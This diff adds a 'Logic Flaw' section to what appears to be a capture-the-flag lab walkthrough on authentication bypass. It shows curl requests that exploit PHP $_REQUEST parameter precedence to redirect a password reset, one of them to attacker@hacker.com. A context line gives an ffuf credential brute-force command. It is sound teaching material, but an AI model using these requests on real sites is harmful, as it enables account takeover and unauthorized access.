@@ -108,6 +108,48 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 This `ffuf` command is a little different to the previous one in Task 2. Previously we used the `FUZZ` keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own `FUZZ` keyword. In this instance, we've chosen `W1` for our list of valid usernames and `W2` for the list of passwords we will try. The multiple wordlists are again specified with the `-w` argument but separated with a comma.  For a positive match, we're using the `-fc` argument to check for an HTTP status code other than 200.
 
 
+### Logic Flaw
+
+We're going to examine the Reset Password function of the Acme IT Support website (http://10.10.180.182/customers/reset). We see a form asking for the email address associated with the account on which we wish to perform the password reset. If an invalid email is entered, you'll receive the error message "Account not found from supplied email address".
+
+
+
+For demonstration purposes, we'll use the email address `robert@acmeitsupport.thm` which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address. If we enter robert as the username and press the Check Username button, you'll be presented with a confirmation message that a password reset email will be sent to `robert@acmeitsupport.thm`.
+
+
+
+At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.
+
+This walkthrough will require running both of the below Curl Requests on the AttackBox which can be opened by using the Blue Button Above.
+
+In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a `GE`T field.
+
+Let's illustrate this by using the curl tool to manually make the request to the webserver.
+
+Curl Request 1:
+```console
+curl 'http://10.10.180.182/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+```
+We use the `-H` flag to add an additional header to the request. In this instance, we are setting the `Content-Type` to `application/x-www-form-urlencoded`, which lets the web server know we are sending form data so it properly understands our request.
+In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.
+
+The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and `POST` data, the application logic for this variable favours `POST` data fields rather than the query string, so if we add another parameter to the `POST` form, we can control where the password reset email gets delivered.
+
+Curl Request 2:
+```console
+curl 'http://10.10.180.182/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+```
+
+
+For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of `{username}@customer.acmeitsupport.thm`
+
+Now rerunning Curl Request 2 but with your `@acmeitsupport.thm` in the email field you'll have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.
+
+Curl Request 2 (but using your @acmeitsupport.thm account):
+```console
+curl 'http://10.10.180.182/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
+```
+
 
 
 
